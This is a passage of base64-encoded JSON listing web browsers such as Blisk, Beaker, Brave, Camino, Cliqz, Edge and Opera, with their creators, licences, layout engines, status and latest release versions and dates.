cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1QTCAyLjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Nb3ppbGxhX1B1YmxpY19MaWNlbnNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR29hbm5hXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR29hbm5hXyhzb2Z0d2FyZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIyMDIwLjEwLjA1XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiNSBPY3RvYmVyIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkJsaXNrXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJsaXNrXCIsXHJcbiAgICAgICAgICAgICAgICBcInR5cGVcIjogXCJXZWIgQnJvd3NlclwiLFxyXG4gICAgICAgICAgICAgICAgXCJ1aVwiOiBcIkdyYXBoaWNhbE1vZGVcIixcclxuICAgICAgICAgICAgICAgIFwiY3JlYXRvclwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlzayB0ZWFtXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIkZyZWVcIjogXCJMaW1pdGVkXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJQYWlkXCI6IFwiVW5saW1pdGVkIFByb1wiXHJcbiAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJQcm9wcmlldGFyeVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1Byb3ByaWV0YXJ5X3NvZnR3YXJlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmxpbmtcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CbGlua18od2ViX2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJWOFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL1Y4XyhKYXZhU2NyaXB0X2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIxMi4wLjkyLjgzXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiSnVuZSAyOSwgMjAxOVwiXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQmVha2VyQnJvd3NlclwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCZWFrZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJsdWUgTGluayBMYWJzXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2JlYWtlcmJyb3dzZXIuY29tXFwvYWJvdXRcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1JVCBMaWNlbnNlXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvTUlUX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwibWFjT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIwLjguMTBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiTWFyY2ggMTMsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJXaW5kb3dzXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMC44LjEwXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIk1hcmNoIDEzLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiTGludXhcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIwLjguMTBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiTWFyY2ggMTMsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJFbGVjdHJvblwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJFbGVjdHJvblwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiRWxlY3Ryb24gKHNvZnR3YXJlIGZyYW1ld29yaylcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiR2l0SHViXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR2l0SHViXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJBY3RpdmVcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNSVQgTGljZW5zZVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL01JVF9MaWNlbnNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXlvdXRcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQmxpbmtcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9CbGlua18od2ViX2VuZ2luZSlcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxhdGVzdC1yZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICBcIlN0YWJsZSByZWxlYXNlXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMTAuMS41XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIjIzIE9jdG9iZXIgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIlByZXZpZXcgcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjExLjAuMC1iZXRhLjE2XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIjI0IE9jdG9iZXIgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIkJyYXZlXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJyYXZlIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJyYXZlIFNvZnR3YXJlIEluY1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JyYXZlXyhicm93c2VyKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTVBMIDIuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL01vemlsbGFfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiQW5kcm9pZFwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjEuMTUuNzNcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiMTUgT2N0b2JlciAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwiaU9TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMS4yMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIyNSBTZXB0ZW1iZXIgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIm1hY09TXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMS4xNS43NVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIxNiBPY3RvYmVyIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJXaW5kb3dzXCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMS4xNS43NVwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIxNiBPY3RvYmVyIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJMaW51eFwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjEuMTUuNzVcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiMTYgT2N0b2JlciAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiQ2FtaW5vXCI6IHtcclxuICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkNhbWlub1wiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiVGhlIENhbWlubyBQcm9qZWN0XCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJjb3N0XCI6IFwiRnJlZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJzdGF0dXNcIjogXCJkaXNjb250aW51ZWRcIixcclxuICAgICAgICAgICAgICAgIFwibGljZW5jZVwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJNUEwgMS4xXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvTW96aWxsYV9QdWJsaWNfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkdQTFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dOVV9HZW5lcmFsX1B1YmxpY19MaWNlbnNlXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTEdQTFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dOVV9MZXNzZXJfR2VuZXJhbF9QdWJsaWNfTGljZW5zZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkdlY2tvXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvR2Vja29fKGxheW91dF9lbmdpbmUpXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMi4xLjJcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIxNCBNYXJjaCAyMDEyXCJcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJDbGlxelwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJDbGlxelwiLFxyXG4gICAgICAgICAgICAgICAgXCJ0eXBlXCI6IFwiV2ViIEJyb3dzZXJcIixcclxuICAgICAgICAgICAgICAgIFwidWlcIjogXCJHcmFwaGljYWxNb2RlXCIsXHJcbiAgICAgICAgICAgICAgICBcImNyZWF0b3JcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiQ2xpcXogR21iSFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiZGlzY29udGludWVkXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTVBMIDIuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL01vemlsbGFfUHVibGljX0xpY2Vuc2VcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJHZWNrb1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0dlY2tvXyhsYXlvdXRfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwiQW5kcm9pZFwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjEuOS43XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkFwcmlsIDQsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgICAgICAgICAgXCJpT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIzLjYuM1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCJKdW5lIDMwLCAyMDIwXCJcclxuICAgICAgICAgICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICAgICAgICAgIFwibWFjT1NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIxLjM4LjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiSnVseSAyMiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIldpbmRvd3NcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcInZlcnNpb25cIjogXCIxLjM4LjBcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJkYXRlXCI6IFwiSnVseSAyMiwgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgICAgICAgICBcIkxpbnV4XCI6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiMS4zOC4wXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIkp1bHkgMjIsIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSxcclxuICAgICAgICAgICAgXCJFZGdcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiTWljcm9zb2Z0IEVkZ2VcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk1pY3Jvc29mdCBDb3JwXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL3d3dy5taWNyb3NvZnRlZGdlaW5zaWRlci5jb21cXC9lbi11c1xcL1wiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwiY29zdFwiOiBcIkZyZWVcIixcclxuICAgICAgICAgICAgICAgIFwic3RhdHVzXCI6IFwiQWN0aXZlXCIsXHJcbiAgICAgICAgICAgICAgICBcImxpY2VuY2VcIjogW1xyXG4gICAgICAgICAgICAgICAgICAgIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiUHJvcHJpZXRhcnlcIixcclxuICAgICAgICAgICAgICAgICAgICAgICAgXCJsaW5rXCI6IFwiaHR0cHM6XFwvXFwvZW4ud2lraXBlZGlhLm9yZ1xcL3dpa2lcXC9Qcm9wcmlldGFyeV9zb2Z0d2FyZVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF5b3V0XCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIkJsaW5rXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvQmxpbmtfKHdlYl9lbmdpbmUpXCJcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBdLFxyXG4gICAgICAgICAgICAgICAgXCJsYXRlc3QtcmVsZWFzZVwiOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgXCJ2ZXJzaW9uXCI6IFwiODguMC42NzMuMFwiLFxyXG4gICAgICAgICAgICAgICAgICAgIFwiZGF0ZVwiOiBcIjE0IE9jdG9iZXIgMjAyMFwiXHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH0sXHJcbiAgICAgICAgICAgIFwiT3BlcmFcIjoge1xyXG4gICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwiT3BlcmFcIixcclxuICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcIldlYiBCcm93c2VyXCIsXHJcbiAgICAgICAgICAgICAgICBcInVpXCI6IFwiR3JhcGhpY2FsTW9kZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJjcmVhdG9yXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIk9wZXJhIFNvZnR3YXJlXCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvT3BlcmFfU29mdHdhcmVcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImNvc3RcIjogXCJGcmVlXCIsXHJcbiAgICAgICAgICAgICAgICBcInN0YXR1c1wiOiBcIkFjdGl2ZVwiLFxyXG4gICAgICAgICAgICAgICAgXCJsaWNlbmNlXCI6IFtcclxuICAgICAgICAgICAgICAgICAgICB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIlByb3ByaWV0YXJ5XCIsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibGlua1wiOiBcImh0dHBzOlxcL1xcL2VuLndpa2lwZWRpYS5vcmdcXC93aWtpXFwvUHJvcHJpZXRhcnlfc29mdHdhcmVcIlxyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIF0sXHJcbiAgICAgICAgICAgICAgICBcImxheW91dFwiOiBbXHJcbiAgICAgICAgICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJCbGlua1wiLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBcImxpbmtcIjogXCJodHRwczpcXC9cXC9lbi53aWtpcGVkaWEub3JnXFwvd2lraVxcL0JsaW5rXyh3ZWJfZW5naW5lKVwiXHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgXSxcclxuICAgICAgICAgICAgICAgIFwibGF0ZXN0LXJlbGVhc2VcIjoge1xyXG4gICAgICAgICAgICAgICAgICAgIFwidmVyc2lvblwiOiBcIjcxLjAuMzc3MC4yNzFcIixcclxuICAgICAgICAgICAgICAgICAgICBcImRhdGVcIjogXCIxNCBPY3RvYmVyIDIwMjBcIlxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9LFxyXG4gICAgICAgICAgICBcIk9wZXJhIE1vYmlsZVwiOiB7XHJcbiAgICAgICAgICAgICAgICBcIm5hbWVcIjogXCJPcGVyYVwiLFxyXG4gICAgICAgICAgICAgICAgX